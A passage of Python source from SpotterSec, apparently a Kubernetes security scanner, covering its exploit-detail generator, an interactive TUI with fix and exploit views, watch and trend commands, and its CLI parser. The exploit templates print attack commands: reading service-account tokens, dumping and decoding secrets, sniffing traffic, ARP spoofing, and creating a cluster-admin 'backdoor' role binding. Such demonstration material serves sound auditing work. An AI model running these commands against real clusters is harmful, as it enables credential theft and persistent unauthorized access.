               "cat /proc/1/environ | tr '\\0' '\\n' # read init env vars\n"
               "# Find other k8s SA tokens from host processes:\n"
               "grep -r 'token' /proc/*/environ 2>/dev/null\n"
               if rid == "NS001" else
               "# With hostNetwork — sniff cluster traffic:\n"
               "apk add tcpdump\n"
               "tcpdump -i eth0 -A port 443 or port 6443\n"
               "# Or scan internal cluster IPs:\n"
               "apk add nmap && nmap -sV 10.96.0.0/12"))

    if rid == "SA001":  # SA token
        return header + (
            "# SA token auto-mounted — steal and use for K8s API calls\n"
            f"kubectl exec -it {name} {ns_flag} -- sh\n\n"
            "# Inside the pod:\n"
            "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n"
            "CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n"
            "NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)\n\n"
            "# Check what this token can do:\n"
            "kubectl auth can-i --list --token=$TOKEN\n\n"
            "# Try reading secrets:\n"
            "kubectl get secrets -n $NS --token=$TOKEN\n"
            "kubectl get secrets -A --token=$TOKEN")

    if rid == "RBAC001":  # cluster-admin
        return header + (
            "# This SA has cluster-admin — once you have the token, full cluster access\n\n"
            "# 1. Get the token (from the pod or the secret):\n"
            f"kubectl exec -it <pod-using-{name}> {ns_flag} -- \\\n"
            "  cat /var/run/secrets/kubernetes.io/serviceaccount/token\n\n"
            "# Or extract from the secret directly:\n"
            f"kubectl get secret -n {ns or 'kube-system'} \\\n"
            "  $(kubectl get sa " + name + f" -n {ns or 'kube-system'} -o jsonpath='{{.secrets[0].name}}') \\\n"
            "  -o jsonpath='{.data.token}' | base64 -d\n\n"
            "# 2. With the token — own the cluster:\n"
            "export TOKEN=<token-from-above>\n"
            "kubectl get secrets -A --token=$TOKEN\n"
            "kubectl create clusterrolebinding backdoor \\\n"
            "  --clusterrole=cluster-admin \\\n"
            "  --serviceaccount=default:attacker \\\n"
            "  --token=$TOKEN")

    if rid == "ENV001":  # hardcoded cred
        return header + (
            "# Hardcoded credential in env var — readable by anyone who can exec or describe the pod\n\n"
            "# Method 1 — kubectl describe (no exec needed, just RBAC read access):\n"
            f"kubectl describe {kind.lower()} {name} {ns_flag} | grep -A5 env\n\n"
            "# Method 2 — from inside the pod:\n"
            f"kubectl exec -it {name} {ns_flag} -- env | grep -iE 'pass|key|secret|token|pwd'\n\n"
            "# Method 3 — read the pod spec directly:\n"
            f"kubectl get {kind.lower()} {name} {ns_flag} -o jsonpath='{{.spec.containers[*].env}}'")

    if rid == "RBAC004":  # secrets read
        return header + (
            "# This role can read Secrets — extract all credentials in scope\n\n"
            "# Get a token for this SA (from a pod using it, or via exec):\n"
            "export TOKEN=<sa-token>\n\n"
            "# Dump all secrets in namespace:\n"
            f"kubectl get secrets {ns_flag} --token=$TOKEN -o json | \\\n"
            "  jq '.items[] | {name:.metadata.name, data:.data}'\n\n"
            "# Decode a specific secret:\n"
            "kubectl get secret <secret-name> -o jsonpath='{.data}' --token=$TOKEN | \\\n"
            "  jq 'to_entries[] | .key + \": \" + (.value | @base64d)'")

    if rid == "ING001":  # no TLS
        return header + (
            "# Ingress serving HTTP — traffic is unencrypted and interceptable\n\n"
            "# If you have network access (same cluster or adjacent network):\n"
            "# Sniff the traffic:\n"
            "tcpdump -i any -A 'tcp port 80' | grep -iE 'cookie|auth|password|token'\n\n"
            "# Or perform a MITM via ARP spoofing on the network:\n"
            "# arpspoof -i eth0 -t <target-ip> <gateway-ip>\n\n"
            "# Practical impact: session cookies, Basic auth headers, API tokens in transit")

    if rid == "NET001":  # no NetworkPolicy
        return header + (
            "# No NetworkPolicy — any pod in any namespace can reach this workload\n\n"
            "# From any compromised pod in the cluster:\n"
            f"# Find the service IP for {name}:\n"
            f"curl http://{name}.{ns}.svc.cluster.local/\n\n"
            "# Port scan the workload:\n"
            "nmap -sV " + (name + "." + ns + ".svc.cluster.local") + "\n\n"
            "# If it exposes an admin interface or unauthenticated API:\n"
            f"curl -s http://{name}.{ns}.svc.cluster.local/api/v1/\n"
            f"curl -s http://{name}.{ns}.svc.cluster.local/metrics  # Prometheus endpoint")

    # Generic fallback
    steps = f.attack_chain or ["See attack chain above"]
    lines = "\n".join(f"# {i+1}. {s}" for i, s in enumerate(steps))
    return header + f"# Attack chain:\n{lines}\n\n# See: {f.scenario_url}"


# ─────────────────────────────────────────────────────────────
# TUI — Interactive finding browser
# ─────────────────────────────────────────────────────────────

def _tui_getch():
    """Read a single keypress — returns string. Handles arrows."""
    import tty, termios
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        ch = sys.stdin.read(1)
        if ch == '\x1b':
            ch2 = sys.stdin.read(1)
            if ch2 == '[':
                ch3 = sys.stdin.read(1)
                return {'A': 'UP', 'B': 'DOWN', 'C': 'RIGHT', 'D': 'LEFT'}.get(ch3, '')
            return 'ESC'
        return ch
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)


def _tui_clear():
    os.system('clear' if os.name != 'nt' else 'cls')


def cmd_tui(args):
    """Interactive TUI — browse findings, toggle exploit/fix views."""
    import subprocess

    render_banner()

    # ── Load findings ──
    findings: list[Finding] = []

    if getattr(args, 'input', None):
        # Load from JSON file
        try:
            data = json.loads(Path(args.input).read_text())
            # Rebuild Finding objects from JSON
            for fname, flist in data.items():
                for fd in flist:
                    findings.append(Finding(
                        rule_id=fd.get("rule_id",""),
                        severity=fd.get("severity",""),
                        title=fd.get("title",""),
                        description=fd.get("description",""),
                        attack_chain=fd.get("attack_chain",[]),
                        fix_snippet=fd.get("fix_snippet",""),
                        scenario_url=fd.get("scenario_url",""),
                        resource_key=fd.get("resource_key",""),
                    ))
        except Exception as e:
            console.print(f"[red]Failed to load {args.input}: {e}[/red]")
            return
    else:
        # Live cluster audit
        console.print("  [dim]Running live cluster audit...[/dim]\n")
        ALL_RESOURCES = [
            ("clusterrolebindings", True), ("clusterroles", True),
            ("namespaces", True), ("validatingwebhookconfigurations", True),
            ("mutatingwebhookconfigurations", True),
            ("pods", False), ("deployments", False), ("daemonsets", False),
            ("statefulsets", False), ("jobs", False), ("cronjobs", False),
            ("rolebindings", False), ("roles", False), ("services", False),
            ("ingresses", False), ("configmaps", False),
            ("networkpolicies", False), ("poddisruptionbudgets", False),
        ]
        ns_flag = ["-n", args.namespace] if getattr(args, "namespace", None) else ["-A"]
        yaml_parts = []
        for idx, (rtype, cluster_scoped) in enumerate(ALL_RESOURCES, 1):
            flags = [] if cluster_scoped else ns_flag
            console.print(f"  [dim][{idx}/{len(ALL_RESOURCES)}] {rtype}[/dim]")
            try:
                r = subprocess.run(
                    ["kubectl", "get", rtype] + flags + ["-o", "yaml"],
                    capture_output=True, text=True, timeout=20)
                if r.stdout.strip():
                    yaml_parts.append(r.stdout)
            except Exception:
                pass
        if not yaml_parts:
            console.print("[yellow]No resources returned.[/yellow]")
            return
        findings = scan_yaml_string("\n---\n".join(yaml_parts), "<live-cluster>")
        for f in findings:
            f.line_num = None
            f.line_content = None
            f.context_lines = []

    if not findings:
        console.print("[green]✓ No findings.[/green]")
        return

    # Sort by severity
    findings.sort(key=lambda f: SEV_ORDER.get(f.severity, 5))

    # ── TUI loop ──
    _tui_browse(findings)


def _tui_browse(findings: list[Finding]):
    """Main TUI browse loop."""
    idx = 0
    page_size = 20

    while True:
        _tui_clear()
        total = len(findings)
        counts = {s: sum(1 for f in findings if f.severity == s) for s in SEV}

        # Header
        print(f"\033[1m  SpotterSec TUI  \033[0m  "
              f"\033[31m{counts['CRITICAL']}C\033[0m  "
              f"\033[33m{counts['HIGH']}H\033[0m  "
              f"\033[36m{counts['MEDIUM']}M\033[0m  "
              f"\033[37m{counts['LOW']}L\033[0m  "
              f"  \033[2m{total} findings\033[0m")
        print()
        print(f"  \033[2m↑↓ navigate   Enter/number = select   q = quit\033[0m")
        print()

        # Show page around current idx
        page_start = max(0, min(idx - page_size // 2, total - page_size))
        page_end   = min(total, page_start + page_size)

        for i in range(page_start, page_end):
            f   = findings[i]
            sev = f.severity
            colors = {
                "CRITICAL": "\033[1;31m", "HIGH": "\033[1;33m",
                "MEDIUM":   "\033[1;36m", "LOW":  "\033[2;37m",
            }
            icons = {"CRITICAL": "💀", "HIGH": "🔴", "MEDIUM": "🟡", "LOW": "🔵"}
            col   = colors.get(sev, "")
            icon  = icons.get(sev, " ")
            reset = "\033[0m"

            rkey_short = f.resource_key.split("/")[-1][:30] if f.resource_key else ""
            title_short = f.title[:45]

            if i == idx:
                print(f"  \033[7m {i+1:3}.  {icon} {col}{sev:<8}{reset}\033[7m  {title_short:<45}  {rkey_short}\033[0m")
            else:
                print(f"  {i+1:3}.  {icon} {col}{sev:<8}{reset}  {title_short:<45}  \033[2m{rkey_short}\033[0m")

        if total > page_size:
            print(f"\n  \033[2mShowing {page_start+1}–{page_end} of {total}\033[0m")

        print()

        # Input
        try:
            ch = _tui_getch()
        except Exception:
            # Fallback: numbered input
            try:
                raw = input("  Select finding (number) or q to quit: ").strip()
                if raw.lower() == 'q':
                    break
                if raw.isdigit():
                    n = int(raw) - 1
                    if 0 <= n < total:
                        _tui_detail(findings, n)
                continue
            except (EOFError, KeyboardInterrupt):
                break

        if ch in ('q', 'Q', '\x03'):
            break
        elif ch == 'UP':
            idx = max(0, idx - 1)
        elif ch == 'DOWN':
            idx = min(total - 1, idx + 1)
        elif ch in ('\r', '\n', ' '):
            _tui_detail(findings, idx)
        elif ch.isdigit():
            # Start number entry
            num_str = ch
            print(f"\n  \033[2mJump to finding: {num_str}\033[0m", end='', flush=True)
            try:
                while True:
                    c2 = _tui_getch()
                    if c2 in ('\r', '\n'):
                        break
                    elif c2 in ('\x7f', '\x08'):  # backspace
                        num_str = num_str[:-1]
                        print(f"\r  \033[2mJump to finding: {num_str}  \033[0m", end='', flush=True)
                    elif c2.isdigit():
                        num_str += c2
                        print(f"\r  \033[2mJump to finding: {num_str}  \033[0m", end='', flush=True)
                    else:
                        break
                n = int(num_str) - 1
                if 0 <= n < total:
                    idx = n
            except Exception:
                pass

    _tui_clear()
    console.print("\n  [dim]SpotterSec TUI exited.[/dim]\n")


def _tui_detail(findings: list[Finding], idx: int):
    """Show detail view for a single finding with e/f toggle."""
    f    = findings[idx]
    mode = 'f'  # start in fix mode

    while True:
        _tui_clear()
        total = len(findings)
        sev   = f.severity
        colors = {
            "CRITICAL": "\033[1;31m", "HIGH": "\033[1;33m",
            "MEDIUM":   "\033[1;36m", "LOW":  "\033[2;37m",
        }
        icons = {"CRITICAL": "💀", "HIGH": "🔴", "MEDIUM": "🟡", "LOW": "🔵"}
        col   = colors.get(sev, "")
        reset = "\033[0m"

        # Header
        print(f"\n  {icons.get(sev,'')} {col}{sev}{reset}  \033[1m{f.title}\033[0m  \033[2m[{f.rule_id}]\033[0m")
        print(f"  \033[2mResource: {f.resource_key}\033[0m")
        print()

        # Tab bar
        fix_tab     = f"\033[7m  fix (f)  \033[0m" if mode == 'f' else "\033[2m  fix (f)  \033[0m"
        exploit_tab = f"\033[7m  exploit (e)  \033[0m" if mode == 'e' else "\033[2m  exploit (e)  \033[0m"
        print(f"  {fix_tab}  {exploit_tab}")
        print()

        if mode == 'f':
            # ── FIX VIEW ──
            print(f"  \033[2m{textwrap.fill(f.description, 86)}\033[0m\n")
            print(f"  \033[1mExact fix for {f.resource_key or 'this resource'}:\033[0m\n")
            fix_cmd = _generate_kubectl_fix(f)
            # Syntax highlight: lines starting with # are comments
            for line in fix_cmd.splitlines():
                if line.strip().startswith('#'):
                    print(f"  \033[2;32m{line}\033[0m")
                elif line.strip().startswith('kubectl') or line.strip().startswith('helm'):
                    print(f"  \033[1;36m{line}\033[0m")
                elif '<<EOF' in line or line.strip() == 'EOF':
                    print(f"  \033[33m{line}\033[0m")
                else:
                    print(f"  \033[37m{line}\033[0m")
            if f.scenario_url:
                print(f"\n  \033[2;34m↗ {f.scenario_url}\033[0m")

        else:
            # ── EXPLOIT VIEW ──
            print(f"  \033[1;31mOffensive operator view — demonstration commands\033[0m\n")
            exploit = _generate_exploit_detail(f)
            for line in exploit.splitlines():
                if line.strip().startswith('#'):
                    print(f"  \033[2;31m{line}\033[0m")
                else:
                    print(f"  \033[1;33m{line}\033[0m")

        # Nav footer
        print()
        prev_hint = f"← {idx}" if idx > 0 else ""
        next_hint = f"{idx+2} →" if idx < total-1 else ""
        print(f"  \033[2m[e] exploit  [f] fix  [←] prev  [→] next  [b] back to list  [q] quit  "
              f"{prev_hint}  {next_hint}\033[0m")

        try:
            ch = _tui_getch()
        except Exception:
            try:
                ch = input().strip().lower()
            except (EOFError, KeyboardInterrupt):
                break

        if ch in ('q', 'Q', '\x03'):
            _tui_clear()
            console.print("\n  [dim]SpotterSec TUI exited.[/dim]\n")
            sys.exit(0)
        elif ch in ('b', 'B', 'ESC'):
            break
        elif ch == 'e':
            mode = 'e'
        elif ch == 'f':
            mode = 'f'
        elif ch == 'LEFT' and idx > 0:
            idx -= 1
            f = findings[idx]
        elif ch == 'RIGHT' and idx < total - 1:
            idx += 1
            f = findings[idx]



# ─────────────────────────────────────────────────────────────
# CMD: watch  (re-scan on file change)
# ─────────────────────────────────────────────────────────────
def cmd_watch(args):
    render_banner()
    paths = [Path(p) for p in args.paths]
    ignore_rules = {r.strip().upper() for r in args.ignore.split(",")} if args.ignore else set()
    sev_map = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    min_sev = sev_map.get((args.severity or "").lower(), 4)

    def collect_files(paths):
        files = []
        for p in paths:
            if p.is_dir():
                files.extend(sorted(p.rglob("*.yaml")) + sorted(p.rglob("*.yml")))
            elif p.is_file():
                files.append(p)
        return files

    def scan_and_print(filepath: Path):
        content = filepath.read_text(encoding="utf-8", errors="replace")
        findings = scan_yaml_string(content, str(filepath))
        findings = [f for f in findings
                    if f.rule_id not in ignore_rules
                    and f.rule_id.split("_")[0] not in ignore_rules
                    and sev_map.get(f.severity.lower(), 4) <= min_sev]
        risk = compute_risk_score(findings)
        console.clear()
        render_banner()
        console.print(f"[dim]Watching {len(collect_files(paths))} file(s) — Ctrl+C to stop[/dim]")
        render_results(findings, str(filepath), explain=args.explain, risk=risk, group=True)
        console.print(f"\n[dim]Last scan: {time.strftime('%H:%M:%S')}[/dim]")

    mtimes = {}
    console.print(f"[dim]Watching {' '.join(args.paths)} — Ctrl+C to stop[/dim]")

    try:
        while True:
            for fp in collect_files(paths):
                try:
                    mtime = fp.stat().st_mtime
                    if mtimes.get(str(fp)) != mtime:
                        mtimes[str(fp)] = mtime
                        scan_and_print(fp)
                except Exception:
                    pass
            time.sleep(args.interval)
    except KeyboardInterrupt:
        console.print("\n[dim]Watch stopped.[/dim]")


# ─────────────────────────────────────────────────────────────
# CMD: trend
# ─────────────────────────────────────────────────────────────
def cmd_trend(args):
    render_banner()
    try:
        baseline = json.loads(Path(args.baseline).read_text())
        current  = json.loads(Path(args.current).read_text())
    except Exception as e:
        console.print(f"[red]Error reading JSON files: {e}[/red]"); sys.exit(1)
    render_trend(baseline, current)


# ─────────────────────────────────────────────────────────────
# BUILD PARSER
# ─────────────────────────────────────────────────────────────
def build_parser():
    p = argparse.ArgumentParser(
        prog="spottersec",
        description=f"SpotterSec v{VERSION} — K8s Security Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(f"""\
            v{VERSION} — Examples:
              spottersec scan pod.yaml
              spottersec scan ./k8s/ --explain --group
              spottersec scan - --explain              # stdin
              kubectl get pod mypod -o yaml | spottersec scan -
              spottersec scan pod.yaml --diff
              spottersec scan pod.yaml --fix
              spottersec scan pod.yaml --write-fix
              spottersec scan pod.yaml --output json > results.json
              spottersec fix ./k8s/                    # interactive patch approval
              spottersec fix ./k8s/ --yes              # non-interactive, apply all
              spottersec audit                         # live cluster via kubectl
              spottersec audit -n production --explain
              spottersec watch pod.yaml                # re-scan on save
              spottersec trend baseline.json current.json
              spottersec rules
              spottersec rules --severity high
              spottersec attack                         # attack path analysis
              spottersec attack -n production
              spottersec blast-radius my-app             # RBAC blast radius for pod/SA
              spottersec blast-radius sa/flux-system/kustomize-controller
              spottersec audit --skip-system-roles       # hide built-in k8s system roles
              spottersec audit --interactive             # TUI after live scan
              spottersec tui                             # TUI from live cluster
              spottersec tui results.json               # TUI from saved scan
        """),
    )
    sub = p.add_subparsers(dest="command")

    # ── scan ──
    sc = sub.add_parser("scan", help="Scan YAML files, directories, or stdin")
    sc.add_argument("paths", nargs="+", help="File(s), director(ies), or '-' for stdin")
    sc.add_argument("--explain",    action="store_true", help="Full attack chains + fixes")
    sc.add_argument("--group",      action="store_true", help="Group findings by resource")
    sc.add_argument("--fix",        action="store_true", help="Print auto-patched YAML to stdout")
    sc.add_argument("--patch",      action="store_true", help="Alias for --fix")
    sc.add_argument("--write-fix",  action="store_true", dest="write_fix")
    sc.add_argument("--diff",       action="store_true")
    sc.add_argument("--output",     choices=["table","json","sarif"], default="table")
    sc.add_argument("--baseline",   help="JSON file from previous scan (for trend comparison)")
    sc.add_argument("--fail-on",    choices=["critical","high","medium","low"], dest="fail_on")
    sc.add_argument("--severity",   choices=["critical","high","medium","low"])
    sc.add_argument("--ignore",     help="Comma-separated rule IDs to skip")
    sc.add_argument("--no-risk",    action="store_true", dest="no_risk")
    sc.add_argument("--provider",   choices=["static","ollama","anthropic"], default="static")
    sc.add_argument("--llm-url",    dest="llm_url")
    sc.add_argument("--llm-model",  dest="llm_model")
    sc.add_argument("--api-url",    dest="api_url")
    sc.add_argument("--api-key",    dest="api_key")
    sc.add_argument("--debug",      action="store_true")

    # ── fix ──
    fx = sub.add_parser("fix", help="Interactive patch approval — review diffs before applying")
    fx.add_argument("paths", nargs="+")
    fx.add_argument("--yes", "-y", action="store_true", help="Apply all fixes without prompting")
    fx.add_argument("--severity", choices=["critical","high","medium","low"])
    fx.add_argument("--ignore")

    # ── audit ──
    au = sub.add_parser("audit", help="Scan live cluster resources via kubectl")
    au.add_argument("-n", "--namespace", help="Namespace (default: all namespaces)")
    au.add_argument("--resources",  help="Comma-separated resource types to fetch")
    au.add_argument("--explain",    action="store_true")
    au.add_argument("--output",     choices=["table","json","sarif"], default="table")
    au.add_argument("--fail-on",    choices=["critical","high","medium","low"], dest="fail_on")
    au.add_argument("--severity",   choices=["critical","high","medium","low"])
    au.add_argument("--ignore")
    au.add_argument("--skip-system-roles", action="store_true", dest="skip_system_roles", help="Suppress RBAC findings on built-in k8s system roles (system:controller:*, system:kube-*, etc.)")
    au.add_argument("--interactive", "-i", action="store_true", help="Launch interactive TUI after scan")

    # ── watch ──
    wt = sub.add_parser("watch", help="Re-scan files on change (linter mode)")
    wt.add_argument("paths", nargs="+")
    wt.add_argument("--explain",  action="store_true")
    wt.add_argument("--interval", type=float, default=1.0, help="Poll interval seconds (default: 1)")
    wt.add_argument("--severity", choices=["critical","high","medium","low"])
    wt.add_argument("--ignore")

    # ── trend ──
    tr = sub.add_parser("trend", help="Compare two JSON scan outputs — show delta")
    tr.add_argument("baseline", help="Path to baseline JSON (spottersec scan --output json)")
    tr.add_argument("current",  help="Path to current JSON")

    # ── rules ──
    rc = sub.add_parser("rules", help="List all available rules")
    rc.add_argument("--severity", choices=["critical","high","medium","low"])

    # ── tui ──
    tu = sub.add_parser("tui", help="Interactive finding browser with exploit/fix toggle")
    tu.add_argument("input", nargs="?", help="JSON file from 'spottersec scan --output json' (omit for live cluster)")
    tu.add_argument("-n", "--namespace", help="Namespace (for live cluster mode)")

    # ── attack ──
    at = sub.add_parser("attack", help="Attack path analysis — trace exploitable paths through the cluster")
    at.add_argument("-n", "--namespace", help="Namespace to scope analysis")

    # ── blast-radius ──
    br = sub.add_parser("blast-radius", help="RBAC blast radius for a pod or service account")
    br.add_argument("target", help="pod/<name>, pod/<ns>/<name>, sa/<ns>/<name>, or bare pod/SA name")
    br.add_argument("-n", "--namespace", help="Namespace hint for resolution")

    return p


def main():
    parser = build_parser()
    args   = parser.parse_args()
    if not args.command:
        render_banner(); parser.print_help(); return
    dispatch = {
        "scan":         cmd_scan,
        "fix":          cmd_fix,
        "audit":        cmd_audit,
        "watch":        cmd_watch,
        "trend":        cmd_trend,
        "rules":        cmd_rules,
        "attack":       cmd_attack,
        "blast-radius": cmd_blast_radius,
        "tui":          cmd_tui,
    }
    dispatch[args.command](args)


if __name__ == "__main__":
    main()
